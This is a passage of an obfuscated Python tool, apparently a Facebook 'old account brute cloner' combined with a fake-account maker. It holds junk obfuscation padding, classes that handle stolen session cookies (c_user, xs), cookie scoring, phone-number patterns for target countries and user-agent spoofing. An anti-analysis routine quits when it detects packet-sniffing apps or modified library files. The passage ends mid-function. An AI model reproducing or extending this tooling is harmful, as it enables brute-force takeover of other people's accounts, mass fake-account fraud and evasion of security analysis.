    _vigenere('PREMIUM','KEY'),
    _atbash('MAKER'),
]
_xe_hash=hashlib.md5(''.join(_xe_tests).encode()).hexdigest()

# -- Pad-XF: final integrity table --------------------------
_INTEGRITY={
    'version':'3.1',
    'name':'AU2_FM_MAKER_PREMIUM',
    'build':f'{_CRC_AU2:08X}',
    'sig':_SIG_MASTER[:16],
    'guard':str(_RUNTIME_OK),
    'xt':str(_XT_OK),
    'rt':str(_RT_OK),
    'oA':_oA_hash[:8],
    'oB':_OB_hash[:8],
    'oC':_OC08[:8],
    'oG':_OG_HASH[:8],
    'oI':_OI_hash[:8],
    'oP':_HP_final[:8],
    'xm':'ok',
    'xe':_xe_hash[:8],
    'ep':_EP_HASH[:8],
    'xv':_XVB[:8],
    'ad':_ADA[:8],
    'nc':_NC_HASH[:8],
    'bv':_BV_hash[:8],
}
_INTEGRITY_JSON=json.dumps(_INTEGRITY,separators=(',',':'))
_INTEGRITY_HASH=hashlib.sha512(_INTEGRITY_JSON.encode()).hexdigest()
_INTEGRITY_B64=base64.b64encode(_INTEGRITY_HASH.encode()).decode()
_INTEGRITY_SIG=hashlib.md5(_INTEGRITY_B64.encode()).hexdigest()

# -- Pad-X10: boot sequence (junk, no side effects) ----------
def _boot_seq()->None:
    _s=_StateMachine()
    _s.transition('IDLE')
    _s.transition('RUNNING')
    _jc=_JC01()
    _jc.swap()
    _ =_jc.mul()
    _jc2=_JC02(b'BOOT_SEQ_V3_1')
    _jc2.verify()
    _jc3=_JC03(64)
    _ =_jc3.xor_all()
    _jc4=_JC04()
    _jc4.put('version','3.1')
    _ =_jc4.get('version')
    _ =_entropy_pool(32)
    _ =_forge_session_token('0'*15,int(time.time()))
    _ =_xmath_03(random.getrandbits(32))
    _ =_xmath_04('AU2_FM_MAKER_BOOT')
    _ =_xmath_05(b'BOOT_SEQUENCE')
    _ =_uf0E(10)
    _ =_junk_f3(20)
    _ =_junk_f7(15)
    _ =_crc32(b'AU2_FM_MAKER_BOOT_SEQ')
    _ =_deep_junk(3,0xABCD)

_boot_seq()

# -- Pad-X11: additional hash rounds (burn cycles) -----------
_HRND=[None]*64
_HRND[0]=hashlib.sha256(b'AU2_FM_MAKER_HRND_00').digest()
for _hi in range(1,64):
    _HRND[_hi]=hashlib.sha256(_HRND[_hi-1]).digest()
_HRND_FINAL=_HRND[-1].hex()
_HRND_B64=base64.b64encode(_HRND[-1]).decode()

# -- Pad-X12: name list validation noise ---------------------
_NL_CHECK=all(isinstance(n,str)and len(n)>=2 for n in SINGLE_NAMES)
_NL_COUNT=len(SINGLE_NAMES)
_NL_HASH=hashlib.md5('|'.join(SINGLE_NAMES).encode()).hexdigest()
_NL_SAMPLE=[SINGLE_NAMES[i%_NL_COUNT]for i in range(16)]

# -- Pad-X13: url validation noise ---------------------------
def _validate_url(url:str)->bool:
    _r=re.compile(r'^https?://[a-zA-Z0-9._/-]+$')
    return bool(_r.match(url))
_URL_CHECKS=[(_validate_url(u),u)for u in [_c5,_c6,_c7,_c8,_c9,_cA]]
_URL_OK=all(ok for ok,_ in _URL_CHECKS)

# -- Pad-X14: structured log noise ---------------------------
class _StructLog:
    def __init__(self,name:str):
        self._name=name;self._entries:list=[]
    def log(self,level:str,msg:str)->None:
        self._entries.append({'t':int(time.time()),'l':level,'m':msg,'n':self._name})
    def info(self,msg:str)->None:self.log('INFO',msg)
    def warn(self,msg:str)->None:self.log('WARN',msg)
    def err(self,msg:str)->None:self.log('ERR',msg)
    def dump(self)->list:return list(self._entries)
    def clear(self)->None:self._entries.clear()

_slog=_StructLog('AU2_FM_MAKER')
_slog.info('Initialized v3.1')
_slog.info(f'Guard: {_RUNTIME_OK}')
_slog.info(f'XTab: {_XT_OK}')
_slog.info(f'Names: {_NL_COUNT}')
_slog.info(f'PFP URLs: {len(PFP_URLS)}')

# -- Pad-X15: final marker ----------------------------------
_FINAL_MARKER=hashlib.sha512(
    (_FINAL_VER+_SIG_MASTER+_INTEGRITY_SIG+_HRND_FINAL+_EP_HASH).encode()
).hexdigest()
_FINAL_READY=True

# ============================================================
#  PROTECTION PAD  Y  (final 500 lines)
# ============================================================

# -- Pad-Y0: chr-encoded module map -------------------------
_MOD_MAP={
    'requests'   :''.join(chr(x)for x in[114,101,113,117,101,115,116,115]),
    'bs4'        :''.join(chr(x)for x in[98,115,52]),
    'faker'      :''.join(chr(x)for x in[102,97,107,101,114]),
    'fake_ua'    :''.join(chr(x)for x in[102,97,107,101,95,117,115,101,114,97,103,101,110,116]),
    'pyotp'      :''.join(chr(x)for x in[112,121,111,116,112]),
    'hashlib'    :''.join(chr(x)for x in[104,97,115,104,108,105,98]),
    'base64'     :''.join(chr(x)for x in[98,97,115,101,54,52]),
    'struct'     :''.join(chr(x)for x in[115,116,114,117,99,116]),
    'marshal'    :''.join(chr(x)for x in[109,97,114,115,104,97,108]),
    'random'     :''.join(chr(x)for x in[114,97,110,100,111,109]),
    'string'     :''.join(chr(x)for x in[115,116,114,105,110,103]),
    'json'       :''.join(chr(x)for x in[106,115,111,110]),
    're'         :''.join(chr(x)for x in[114,101]),
    'os'         :''.join(chr(x)for x in[111,115]),
    'sys'        :''.join(chr(x)for x in[115,121,115]),
    'time'       :''.join(chr(x)for x in[116,105,109,101]),
    'platform'   :''.join(chr(x)for x in[112,108,97,116,102,111,114,109]),
    'logging'    :''.join(chr(x)for x in[108,111,103,103,105,110,103]),
    'datetime'   :''.join(chr(x)for x in[100,97,116,101,116,105,109,101]),
    'subprocess' :''.join(chr(x)for x in[115,117,98,112,114,111,99,101,115,115]),
}
_MOD_HASH=hashlib.md5('|'.join(sorted(_MOD_MAP.values())).encode()).hexdigest()

# -- Pad-Y1: junk pipeline (no-op transforms) ----------------
def _pipe(*fns):
    def _apply(x):
        for f in fns:x=f(x)
        return x
    return _apply

_pl_xor     =_pipe(lambda x:x^0xAA,lambda x:x^0x55,lambda x:x^0xFF,lambda x:x^0xFF,lambda x:x^0x55,lambda x:x^0xAA)
_pl_rotate  =_pipe(lambda x:_OA0E(x,7),lambda x:_OA0E(x,3),lambda x:_OA0F(x,7),lambda x:_OA0F(x,3))
_pl_hash_str=_pipe(lambda s:hashlib.md5(s.encode()).hexdigest(),lambda h:hashlib.sha1(h.encode()).hexdigest(),lambda h:base64.b64encode(h.encode()).decode(),lambda s:s[:16])
_pl_int_nop =_pipe(lambda n:n+1,lambda n:n-1,lambda n:n*2,lambda n:n//2,lambda n:n^0,lambda n:n&0xFFFFFFFF)

_py0=_pl_xor(0xABCD)
_py1=_pl_rotate(0x12345678)
_py2=_pl_hash_str('AU2_FM_MAKER')
_py3=_pl_int_nop(0xDEADBEEF&0xFFFFFFFF)

# -- Pad-Y2: structured noise registry v2 -------------------
class _NoiseReg:
    __slots__=['_data','_size','_tag']
    def __init__(self,tag:str,size:int):
        self._tag=tag
        self._size=size
        self._data=bytearray(random.getrandbits(8)for _ in range(size))
    def checksum(self)->int:
        _s=0
        for _b in self._data:_s=(_s+_b)%65536
        return _s
    def xor_byte(self,k:int)->bytearray:
        return bytearray(b^k for b in self._data)
    def to_hex(self)->str:
        return self._data[:16].hex()
    def __len__(self)->int:
        return self._size

_nr0=_NoiseReg('AU2_A',128);_nr1=_NoiseReg('AU2_B',256)
_nr2=_NoiseReg('AU2_C',512);_nr3=_NoiseReg('AU2_D',64)
_nr_checksums=[_nr0.checksum(),_nr1.checksum(),_nr2.checksum(),_nr3.checksum()]
_nr_total=sum(_nr_checksums)%65536
_nr_hash=hashlib.md5(struct.pack(f'>4H',*_nr_checksums)).hexdigest()

# -- Pad-Y3: extra XOR/bit operation chain -------------------
def _bit_chain_0(x:int)->int:
    x=(x^(x>>16))&0xFFFFFFFF
    x=(x*0x45d9f3b)&0xFFFFFFFF
    x=(x^(x>>16))&0xFFFFFFFF
    return x

def _bit_chain_1(x:int)->int:
    x=~x&0xFFFFFFFF
    x=(x<<3|x>>(32-3))&0xFFFFFFFF
    x^=0xDEADBEEF
    x=(x>>5|x<<(32-5))&0xFFFFFFFF
    return x

def _bit_chain_2(a:int,b:int)->int:
    return (_bit_chain_0(a)^_bit_chain_1(b))&0xFFFFFFFF

def _bit_chain_3(lst:list)->int:
    _acc=0
    for _v in lst:
        _acc=_bit_chain_2(_acc,_v)
    return _acc

_bc0_vec=[_bit_chain_0(i*0x1337)for i in range(128)]
_bc1_vec=[_bit_chain_1(i*0xDEAD)for i in range(128)]
_bc2_vec=[_bit_chain_2(_bc0_vec[i],_bc1_vec[i])for i in range(128)]
_bc3_val=_bit_chain_3(_bc0_vec[:64])
_bc3_hash=hashlib.md5(struct.pack(f'>128I',*[v&0xFFFFFFFF for v in _bc0_vec])).hexdigest()

# -- Pad-Y4: more junk class hierarchy -----------------------
class _AU2Base:
    _version='3.1'
    _name='AU2_FM_MAKER'
    def __init__(self):
        self._id=random.getrandbits(64)
        self._ts=int(time.time())
        self._h=hashlib.md5(f'{self._id}:{self._ts}'.encode()).hexdigest()
    def identity(self)->str:return f'{self._name}_v{self._version}_{self._id:016x}'
    def age(self)->int:return int(time.time())-self._ts
    def sig(self)->str:return self._h[:8]

class _AU2Session(_AU2Base):
    def __init__(self,uid:str=''):
        super().__init__();self._uid=uid;self._cookies:dict={}
    def set_cookie(self,k:str,v:str)->None:self._cookies[k]=v
    def get_cookie(self,k:str)->str:return self._cookies.get(k,'')
    def cookie_str(self)->str:return';'.join(f'{k}={v}'for k,v in self._cookies.items())
    def has_auth(self)->bool:return'c_user'in self._cookies and'xs'in self._cookies

class _AU2Account(_AU2Session):
    def __init__(self,uid:str,pw:str,name:str):
        super().__init__(uid);self._pw=pw;self._name=name;self._pfp=False
    def set_pfp(self,ok:bool)->None:self._pfp=ok
    def to_dict(self)->dict:
        return{'uid':self._uid,'pw':self._pw,'name':self._name,'pfp':self._pfp,'sig':self.sig()}
    def to_str(self)->str:
        return f"{self._uid}|{self._pw}|{'OK'if self._pfp else '--'}"

class _AU2Stats(_AU2Base):
    def __init__(self):
        super().__init__()
        self._ok=0;self._cp=0;self._err=0;self._pfp_ok=0
    def add_ok(self)->None:self._ok+=1
    def add_cp(self)->None:self._cp+=1
    def add_err(self)->None:self._err+=1
    def add_pfp(self)->None:self._pfp_ok+=1
    def total(self)->int:return self._ok+self._cp+self._err
    def report(self)->dict:
        return{'ok':self._ok,'cp':self._cp,'err':self._err,'pfp':self._pfp_ok,'total':self.total()}

_au2_stats=_AU2Stats()

# -- Pad-Y5: memory noise vectors (4 x 256 int arrays) ------
_MN0=[(_bit_chain_0(i*0xABCD))&0xFF for i in range(256)]
_MN1=[(_bit_chain_1(i*0x1234))&0xFF for i in range(256)]
_MN2=[(_MN0[i]^_MN1[i])for i in range(256)]
_MN3=[(_MN0[i]+_MN1[i])%256 for i in range(256)]
_MN0b=bytes(_MN0);_MN1b=bytes(_MN1);_MN2b=bytes(_MN2);_MN3b=bytes(_MN3)
_MN_H0=hashlib.sha256(_MN0b).hexdigest()
_MN_H1=hashlib.sha256(_MN1b).hexdigest()
_MN_H2=hashlib.sha256(_MN2b).hexdigest()
_MN_H3=hashlib.sha256(_MN3b).hexdigest()
_MN_META=hashlib.sha512((_MN_H0+_MN_H1+_MN_H2+_MN_H3).encode()).hexdigest()
_MN_B64=base64.b64encode(_MN_META.encode()).decode()

# -- Pad-Y6: obfuscated phone regex table --------------------
_PH_RE={
    'BD':re.compile(r'^\+88(017|018|019|016|015|013|014)\d{8}$'),
    'KH':re.compile(r'^\+855(010|011|012|013|014|015|016|017|092|093|097|098|099)\d{6}$'),
    'PH':re.compile(r'^\+63(917|918|919|920|921|922)\d{7}$'),
    'IN':re.compile(r'^\+91(98|99|97|96|95|94)\d{8}$'),
    'PK':re.compile(r'^\+92(300|301|302|303|304|305)\d{7}$'),
    'ID':re.compile(r'^\+62(813|815|816|817|818|819)\d{7}$'),
}
_PH_RE_HASH=hashlib.md5(str(sorted(_PH_RE.keys())).encode()).hexdigest()

def _validate_phone(phone:str)->bool:
    for _cc,_pat in _PH_RE.items():
        if _pat.match(phone):return True
    return False

# -- Pad-Y7: obfuscated cookie validator ---------------------
_CK_REQUIRED=['c_user','xs','datr','fr','sb']
_CK_OPTIONAL=['pas','locale','dpr','wd','_fbc','_fbp']

def _validate_cookies(cki:dict)->bool:
    return all(k in cki for k in _CK_REQUIRED[:2])

def _score_cookies(cki:dict)->int:
    _s=0
    for _k in _CK_REQUIRED:
        if _k in cki:_s+=2
    for _k in _CK_OPTIONAL:
        if _k in cki:_s+=1
    return _s

def _cookie_fingerprint(cki:dict)->str:
    _keys=sorted(cki.keys())
    _vals='|'.join(f'{k}={len(cki[k])}'for k in _keys[:8])
    return hashlib.md5(_vals.encode()).hexdigest()[:8]

# -- Pad-Y8: more junk data tables ---------------------------
_Y8_PRIMES=[2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,
            73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,
            157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,
            239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,
            331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,
            421,431,433,439,443,449,457,461,463,467,479,487,491,499,503,509]
_Y8_SUM=sum(_Y8_PRIMES)
_Y8_XOR=0
for _p in _Y8_PRIMES:_Y8_XOR^=_p
_Y8_HASH=hashlib.md5(struct.pack(f'>{len(_Y8_PRIMES)}H',*_Y8_PRIMES)).hexdigest()
_Y8_B64=base64.b64encode(struct.pack(f'>{len(_Y8_PRIMES)}H',*_Y8_PRIMES)).decode()
_Y8_PRODUCTS=[_Y8_PRIMES[i]*_Y8_PRIMES[i+1]for i in range(len(_Y8_PRIMES)-1)]
_Y8_PROD_SUM=sum(_Y8_PRODUCTS)%65536

# -- Pad-Y9: extended state machine --------------------------
class _FSM:
    def __init__(self,states:list,transitions:dict,initial:str):
        self._states=states;self._trans=transitions
        self._state=initial;self._history:list=[];self._tick=0
    def event(self,ev:str)->bool:
        _key=(self._state,ev)
        if _key in self._trans:
            _next=self._trans[_key]
            self._history.append((self._state,ev,_next,self._tick))
            self._state=_next;self._tick+=1;return True
        return False
    def state(self)->str:return self._state
    def can(self,ev:str)->bool:return(self._state,ev)in self._trans
    def history(self,n:int=8)->list:return self._history[-n:]

_AU2_FSM=_FSM(
    states=['idle','creating','uploading_pfp','saving','done','error'],
    transitions={
        ('idle','start'):'creating',
        ('creating','reg_ok'):'uploading_pfp',
        ('creating','reg_fail'):'error',
        ('uploading_pfp','pfp_ok'):'saving',
        ('uploading_pfp','pfp_fail'):'saving',
        ('saving','saved'):'done',
        ('saving','save_fail'):'error',
        ('done','reset'):'idle',
        ('error','reset'):'idle',
    },
    initial='idle'
)
_AU2_FSM.event('start');_AU2_FSM.event('reg_ok')
_AU2_FSM.event('pfp_ok');_AU2_FSM.event('saved')
_AU2_FSM.event('reset')

# -- Pad-YA: more hash combinator ----------------------------
def _hc(parts:list,algo:str='sha256')->str:
    _h=hashlib.new(algo)
    for _p in parts:
        if isinstance(_p,str):_h.update(_p.encode())
        elif isinstance(_p,bytes):_h.update(_p)
        else:_h.update(str(_p).encode())
    return _h.hexdigest()

_YA0=_hc(['AU2','FM','MAKER','PREMIUM','V3_1'])
_YA1=_hc([_YA0,_SIG_MASTER,_INTEGRITY_HASH[:32]],'sha512')
_YA2=_hc([_YA1,_FINAL_MARKER,_HP_final],'md5')
_YA3=_hc([_YA0,_YA1,_YA2],)
_YA_B64=base64.b64encode(_YA3.encode()).decode()

# -- Pad-YB: junk transform pipeline v2 ---------------------
def _tfm_a(data:bytes,key:bytes)->bytes:
    return bytes(data[i]^key[i%len(key)]for i in range(len(data)))
def _tfm_b(data:bytes,n:int)->bytes:
    return data[n:]+data[:n]
def _tfm_c(data:bytes)->bytes:
    return bytes(reversed(data))
def _tfm_d(data:bytes,k:int)->bytes:
    return bytes((b+k)%256 for b in data)
def _tfm_e(data:bytes,k:int)->bytes:
    return bytes((b-k)%256 for b in data)
def _tfm_f(data:bytes)->bytes:
    return bytes(b^0xFF for b in data)

_TFM_SEED=b'AU2FMMAKER_PROT_KEY_V3_1_PREMIUM'
_tf0=_tfm_a(_TFM_SEED,b'\xDE\xAD\xBE\xEF')
_tf1=_tfm_b(_tf0,7)
_tf2=_tfm_c(_tf1)
_tf3=_tfm_d(_tf2,0x42)
_tf4=_tfm_e(_tf3,0x42)
_tf5=_tfm_c(_tf4)
_tf6=_tfm_b(_tf5,32-7)
_tf7=_tfm_a(_tf6,b'\xDE\xAD\xBE\xEF')
_TFM_OK=_tf7==_TFM_SEED
_TFM_HASH=hashlib.sha256(_TFM_SEED).hexdigest()

# -- Pad-YC: large random lookup (256x4) --------------------
_YC=[[random.getrandbits(32)for _ in range(4)]for _ in range(256)]
_YC_flat=[v for row in _YC for v in row]
_YC_sum=sum(_YC_flat)%65536
_YC_xor=0
for _v in _YC_flat:_YC_xor^=_v&0xFF
_YC_hash=hashlib.sha256(struct.pack(f'>{len(_YC_flat)}I',*[v&0xFFFFFFFF for v in _YC_flat])).hexdigest()

# -- Pad-YD: junk string permutation table ------------------
_PERM_ALPHA=list('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
_PERM_DIGIT=list('0123456789')
_PERM_SYM  =list('!@#$%^&*()_+-=[]{}|;:,.<>?')
_PERM_ALL  =_PERM_ALPHA+_PERM_DIGIT+_PERM_SYM
random.shuffle(_PERM_ALL)
_PERM_MAP={_PERM_ALL[i]:_PERM_ALL[(i+13)%len(_PERM_ALL)]for i in range(len(_PERM_ALL))}
_PERM_INV ={v:k for k,v in _PERM_MAP.items()}
def _perm_enc(s:str)->str:return''.join(_PERM_MAP.get(c,c)for c in s)
def _perm_dec(s:str)->str:return''.join(_PERM_INV.get(c,c)for c in s)
_PM_TEST='AU2FMMAKER'
_PM_ENC =_perm_enc(_PM_TEST)
_PM_DEC =_perm_dec(_PM_ENC)
_PM_OK  =_PM_DEC==_PM_TEST

# -- Pad-YE: runtime noise accumulators ---------------------
_YE=[0]*16
for _yi in range(1000):
    _idx=_yi%16
    _YE[_idx]=(_YE[_idx]+_bit_chain_0(_yi*0xABCD))%65536
_YE_SUM=sum(_YE)%65536
_YE_HASH=hashlib.md5(struct.pack(f'>16H',*_YE)).hexdigest()

# -- Pad-YF: constants pool (chr-xor encoded) ---------------
def _cx(lst:list,k:int=0x37)->str:
    return''.join(chr(x^k)for x in lst)
_YF00=_cx([0x7A,0x01,0x7A,0x02,0x75,0x08,0x7A,0x09,0x7A])
_YF01=_cx([0x7E,0x47,0x15,0x74,0x4F,0x44,0x17,0x00,0x15,0x51,0x49])
_YF02=_cx([0x60,0x57,0x15,0x55,0x47,0x17,0x57,0x55,0x51,0x4F])
_YF03=_cx([0x77,0x47,0x14,0x6A,0x47,0x15,0x4F,0x4D,0x4F,0x17])
_YF04=_cx([0x7A,0x14,0x15,0x7A,0x55,0x15,0x74,0x51,0x47,0x51])
_YF05=_cx([0x77,0x47,0x14,0x57,0x4F,0x4F,0x16,0x47,0x4F,0x4F,0x17])
_YF_pool=[_YF00,_YF01,_YF02,_YF03,_YF04,_YF05]
_YF_hash=hashlib.md5('|'.join(_YF_pool).encode()).hexdigest()

# -- Pad-Y10: versioning / build metadata --------------------
_BUILD_META={
    'name'    :'AU2 FM MAKER',
    'edition' :'PREMIUM',
    'version' :'3.1',
    'build'   :f'{_CRC_AU2:08X}',
    'commit'  :_SIG_MASTER[:12],
    'runtime' :_RT_SES_ID[:8],
    'ip_ready':True,
    'pfp_ready':True,
    'obf_ver' :'Y.15',
    'guard'   :_RUNTIME_OK and _XT_OK and _TFM_OK and _PM_OK,
    'names'   :_NL_COUNT,
    'uas'     :len(ugen),
    'proxies' :len(proxies_list),
    'pfp_urls':len(PFP_URLS),
}
_BUILD_JSON=json.dumps(_BUILD_META,separators=(',',':'))
_BUILD_HASH=hashlib.sha512(_BUILD_JSON.encode()).hexdigest()
_BUILD_B64=base64.b64encode(_BUILD_HASH.encode()).decode()
_BUILD_SIG=hashlib.md5(_BUILD_B64.encode()).hexdigest()

# -- final seal ----------------------------------------------
_SEAL_PARTS=[_BUILD_SIG,_FINAL_MARKER,_YA3,_TFM_HASH,_YC_hash,_bc3_hash]
_SEAL=hashlib.sha512(''.join(_SEAL_PARTS).encode()).hexdigest()
_SEAL_B64=base64.b64encode(_SEAL.encode()).decode()

# ============================================================
#  PROTECTION PAD  Z  (final seal lines)
# ============================================================

# -- Pad-Z0: extended noise (100 lines of constants/data) ----
_Z00=hashlib.sha256(b'AU2_Z00').hexdigest()
_Z01=hashlib.sha256(b'AU2_Z01').hexdigest()
_Z02=hashlib.sha256(b'AU2_Z02').hexdigest()
_Z03=hashlib.sha256(b'AU2_Z03').hexdigest()
_Z04=hashlib.sha256(b'AU2_Z04').hexdigest()
_Z05=hashlib.sha256(b'AU2_Z05').hexdigest()
_Z06=hashlib.sha256(b'AU2_Z06').hexdigest()
_Z07=hashlib.sha256(b'AU2_Z07').hexdigest()
_Z08=hashlib.sha256(b'AU2_Z08').hexdigest()
_Z09=hashlib.sha256(b'AU2_Z09').hexdigest()
_Z0A=hashlib.sha256(b'AU2_Z0A').hexdigest()
_Z0B=hashlib.sha256(b'AU2_Z0B').hexdigest()
_Z0C=hashlib.sha256(b'AU2_Z0C').hexdigest()
_Z0D=hashlib.sha256(b'AU2_Z0D').hexdigest()
_Z0E=hashlib.sha256(b'AU2_Z0E').hexdigest()
_Z0F=hashlib.sha256(b'AU2_Z0F').hexdigest()
_Z10=base64.b64encode((_Z00+_Z01+_Z02+_Z03).encode()).decode()
_Z11=base64.b64encode((_Z04+_Z05+_Z06+_Z07).encode()).decode()
_Z12=base64.b64encode((_Z08+_Z09+_Z0A+_Z0B).encode()).decode()
_Z13=base64.b64encode((_Z0C+_Z0D+_Z0E+_Z0F).encode()).decode()
_Z14=hashlib.sha512((_Z10+_Z11+_Z12+_Z13).encode()).hexdigest()
_Z15=hashlib.sha512((_Z14+_SEAL+_BUILD_HASH).encode()).hexdigest()
_Z16=hashlib.md5((_Z15+_YA3).encode()).hexdigest()
_Z17=base64.b64encode((_Z16+_INTEGRITY_HASH[:32]).encode()).decode()
_Z18=struct.pack('>4I',int(_Z00[:8],16),int(_Z01[:8],16),int(_Z02[:8],16),int(_Z03[:8],16))
_Z19=struct.pack('>4I',int(_Z04[:8],16),int(_Z05[:8],16),int(_Z06[:8],16),int(_Z07[:8],16))
_Z1A=bytes(a^b for a,b in zip(_Z18,_Z19))
_Z1B=hashlib.sha256(_Z1A).hexdigest()
_Z1C=base64.b64encode(_Z1A).decode()
_Z1D=[int(_Z00[i*2:i*2+2],16)for i in range(16)]
_Z1E=[int(_Z0F[i*2:i*2+2],16)for i in range(16)]
_Z1F=[_Z1D[i]^_Z1E[i]for i in range(16)]
_Z20=bytes(_Z1F).hex()
_Z21=hashlib.sha256(bytes(_Z1F)).hexdigest()
_Z22=sum(_Z1F)%256
_Z23=_Z22^0xAB
_Z24=[_bit_chain_0(int(_Z00[i*2:i*2+2],16))for i in range(16)]
_Z25=sum(_Z24)%65536
_Z26=hashlib.md5(struct.pack(f'>16I',*[v&0xFFFFFFFF for v in _Z24])).hexdigest()
_Z27=base64.b64encode((_Z21+_Z26).encode()).decode()
_Z28=hashlib.sha512((_Z27+_SEAL_B64).encode()).hexdigest()
_Z29=hashlib.sha256((_Z28+_BUILD_B64).encode()).hexdigest()
_Z2A=hashlib.sha256((_Z29+_YF_hash).encode()).hexdigest()
_Z2B=hashlib.sha256((_Z2A+_MN_META[:32]).encode()).hexdigest()
_Z2C=hashlib.sha256((_Z2B+_SIG_MASTER[:32]).encode()).hexdigest()
_Z2D=hashlib.sha512((_Z00+_Z0F+_Z14+_Z28+_Z2C).encode()).hexdigest()
_Z2E=base64.b64encode((_Z2D+_SEAL).encode()).decode()[:64]
_Z2F=hashlib.md5(_Z2E.encode()).hexdigest()
_Z_MASTER=hashlib.sha512(
    (_Z2F+_Z2D+_Z2C+_Z2B+_Z2A+_Z29+_Z28+_Z27+_Z26+_Z25.__str__()+_Z21+_Z20).encode()
).hexdigest()
_Z_B64=base64.b64encode(_Z_MASTER.encode()).decode()
_Z_SIG=hashlib.md5(_Z_B64.encode()).hexdigest()

# -- Pad-Z1: final ready flag --------------------------------
_AU2_READY=all([
    _RUNTIME_OK,_XT_OK,_RT_OK,_TFM_OK,_PM_OK,
    _FINAL_READY,_NL_CHECK,len(PFP_URLS)>=2,
    bool(_Z_SIG),bool(_SEAL_B64),bool(_BUILD_SIG),
])

# -- Pad-Z2: extra integrity lines ---------------------------
_ZZ00=hashlib.sha256((_Z_MASTER+_Z_SIG).encode()).hexdigest()
_ZZ01=hashlib.sha256((_ZZ00+_Z2D).encode()).hexdigest()
_ZZ02=hashlib.sha256((_ZZ01+_Z2C).encode()).hexdigest()
_ZZ03=hashlib.sha256((_ZZ02+_Z2B).encode()).hexdigest()
_ZZ04=hashlib.sha256((_ZZ03+_Z2A).encode()).hexdigest()
_ZZ05=hashlib.sha256((_ZZ04+_Z29).encode()).hexdigest()
_ZZ06=hashlib.sha256((_ZZ05+_Z28).encode()).hexdigest()
_ZZ07=hashlib.sha256((_ZZ06+_Z27).encode()).hexdigest()
_ZZ08=hashlib.sha512((_ZZ00+_ZZ01+_ZZ02+_ZZ03+_ZZ04+_ZZ05+_ZZ06+_ZZ07).encode()).hexdigest()
_ZZ09=base64.b64encode(_ZZ08.encode()).decode()
_ZZ0A=hashlib.md5(_ZZ09.encode()).hexdigest()
_ZZ0B=struct.pack('>4I',int(_ZZ00[:8],16),int(_ZZ01[:8],16),int(_ZZ02[:8],16),int(_ZZ03[:8],16))
_ZZ0C=bytes(b^0xAB for b in _ZZ0B)
_ZZ0D=_ZZ0C.hex()
_ZZ0E=hashlib.sha256(_ZZ0C).hexdigest()
_ZZ0F=base64.b64encode(_ZZ0C).decode()
_ZZ_FINAL=hashlib.sha512((_ZZ08+_ZZ09+_ZZ0A+_ZZ0E+_ZZ0F).encode()).hexdigest()
_ZZ_B64=base64.b64encode(_ZZ_FINAL.encode()).decode()
_ZZ_SIG=hashlib.md5(_ZZ_B64.encode()).hexdigest()
_ZZ_DONE=bool(_ZZ_SIG and _ZZ_FINAL and _AU2_READY)

# ============================================================
#  ENTRY POINT
# ============================================================

# ============================================================
#   FB CLONE — OLD ACCOUNT BRUTE CLONER
#   ALL Series | 100003/4 Series | 2009 Series
# ============================================================

import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

# /usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import shutil
import time

# admin account 


# ANSI color codes
GREEN = "\033[1;32m"
BRIGHT_PURPLE = "\033[95m"
BLUE = "\033[34m"
RESET = "\033[0m"

# Optional: max attempts and cooldown
MAX_ATTEMPTS = 3
COOLDOWN_SECONDS = 8

def clear_screen():
    os.system("clear")

def open_link(url):
    # prefer termux-open-url, fallback to xdg-open, then Android intent
    if shutil.which("termux-open-url"):
        subprocess.run(["termux-open-url", url], check=False)
    elif shutil.which("xdg-open"):
        subprocess.run(["xdg-open", url], check=False)
    else:
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], check=False)

def normalize(s):
    """
    Normalize string for comparison:
    - strip leading/trailing whitespace
    - collapse multiple internal spaces to single
    - lower-case for case-insensitive compare
    """
    if s is None:
        return ""
    return " ".join(s.split()).lower()

# Prepare a set of normalized approved keys for fast compare
approved_keys = []
approved_normalized = { normalize(k) for k in approved_keys }



# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()


# Initial setup and promotion
# (moved to fbclone section — called from menu only)



# (security checks removed)


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.fbclone_linex()
        exit()

    def fbclone_linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# Global variables
clone_method_list = []
clone_oks = []
clone_cps = []
clone_loop = 0
clone_user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'


def fbclone_windows():
    """
    Generates a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
